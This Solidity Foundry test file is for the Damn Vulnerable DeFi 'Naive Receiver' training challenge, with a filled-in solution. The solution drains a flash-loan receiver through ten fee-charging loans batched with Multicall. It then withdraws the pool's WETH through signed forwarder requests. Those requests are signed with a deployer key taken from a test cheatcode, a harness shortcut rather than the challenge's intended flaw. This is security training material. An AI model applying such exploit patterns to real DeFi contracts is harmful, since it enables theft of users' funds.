// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // get the deployer private key
        (, uint deploPk) = makeAddrAndKey("deployer");
        // build the bytes array for the multicall 
        bytes[] memory calls = new bytes[](10);
        for (uint i; i < 10; ++i) {
            calls[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                address(receiver),
                address(weth),
                1 ether,
                bytes("")
            );
        }

        // multicall payload
        bytes memory multicallPayload = abi.encodeWithSelector(
            Multicall.multicall.selector,
            calls
        );

        // request structure
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: deployer,
            target: address(pool),
            value: 0,
            gas: 5_000_000,
            nonce: forwarder.nonces(deployer),
            data: multicallPayload,
            deadline: block.timestamp + 1 days
        });

        // calculate el digest to firm the request
        bytes32 structHash  = forwarder.getDataHash(request);
        bytes32 domainSeparator = forwarder.domainSeparator();

        // Build the digest EIP-712
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                structHash
            )
        );

        // sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deploPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // call the forwarder to execute the multicall
         (bool success,) = address(forwarder).call{value: 0}(
            abi.encodeWithSignature(
                "execute((address,address,uint256,uint256,uint256,bytes,uint256),bytes)",
                request,
                signature
            )
        );

        // call again to withdraw all funds
        bytes memory withdrawPayload = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector,
            WETH_IN_POOL + WETH_IN_RECEIVER,
            recovery
        );

        // get struct hash for withdraw
        BasicForwarder.Request memory withdrawRequest = BasicForwarder.Request({
            from: deployer,
            target: address(pool),
            value: 0,
            gas: 5_000_000,
            nonce: forwarder.nonces(deployer),
            data: withdrawPayload,
            deadline: block.timestamp + 1 days
        });

        // calculate el digest to firm the withdraw request
        structHash = forwarder.getDataHash(withdrawRequest);
       
        digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                structHash
            )
        );
        // sign the withdraw request
        (v, r, s) = vm.sign(deploPk, digest);
        signature = abi.encodePacked(r, s, v);

        // call the forwarder to execute the withdraw
        address(forwarder).call{value: 0}(
            abi.encodeWithSignature(
                "execute((address,address,uint256,uint256,uint256,bytes,uint256),bytes)",
                withdrawRequest,
                signature
            )
        );

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
